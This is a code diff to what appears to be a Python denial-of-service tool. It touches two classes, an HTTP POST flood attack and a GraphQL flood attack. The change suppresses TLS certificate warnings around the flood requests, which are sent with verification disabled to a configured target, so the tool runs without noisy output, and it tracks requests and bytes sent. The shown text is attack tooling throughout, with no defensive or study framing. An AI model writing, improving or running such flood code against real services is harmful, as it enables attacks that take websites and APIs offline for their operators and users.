@@ -10,6 +10,8 @@ import ssl
 import time
 import random
 import threading
+import warnings
+import urllib3
 from typing import Dict, List, Optional, Any, Callable
 from dataclasses import dataclass
 from urllib.parse import urlparse
@@ -602,13 +604,15 @@ class HTTPPOSTFloodAttack(Layer7Attack):
                             headers['Proxy-Connection'] = 'keep-alive'
                     
                     # Send POST request
-                    response = self.session.post(
-                        f"{'https' if self.config.use_ssl else 'http'}://{self.config.target_host}:{self.config.target_port}{self.config.target_path}",
-                        data=payload_data,
-                        headers=headers,
-                        timeout=10,
-                        verify=False
-                    )
+                    with warnings.catch_warnings():
+                        warnings.simplefilter('ignore', urllib3.exceptions.InsecureRequestWarning)
+                        response = self.session.post(
+                            f"{'https' if self.config.use_ssl else 'http'}://{self.config.target_host}:{self.config.target_port}{self.config.target_path}",
+                            data=payload_data,
+                            headers=headers,
+                            timeout=10,
+                            verify=False
+                        )
                     
                     self.stats['requests_sent'] += 1
                     self.stats['bytes_sent'] += len(payload_data)
@@ -1026,13 +1030,15 @@ class GraphQLFloodAttack(Layer7Attack):
                     }
                     
                     # Send GraphQL request
-                    response = self.session.post(
-                        f"{'https' if self.config.use_ssl else 'http'}://{self.config.target_host}:{self.config.target_port}{self.config.target_path}",
-                        json=payload,
-                        headers=headers,
-                        timeout=10,
-                        verify=False
-                    )
+                    with warnings.catch_warnings():
+                        warnings.simplefilter('ignore', urllib3.exceptions.InsecureRequestWarning)
+                        response = self.session.post(
+                            f"{'https' if self.config.use_ssl else 'http'}://{self.config.target_host}:{self.config.target_port}{self.config.target_path}",
+                            json=payload,
+                            headers=headers,
+                            timeout=10,
+                            verify=False
+                        )
                     
                     self.stats['requests_sent'] += 1
                     self.stats['bytes_sent'] += len(str(payload))
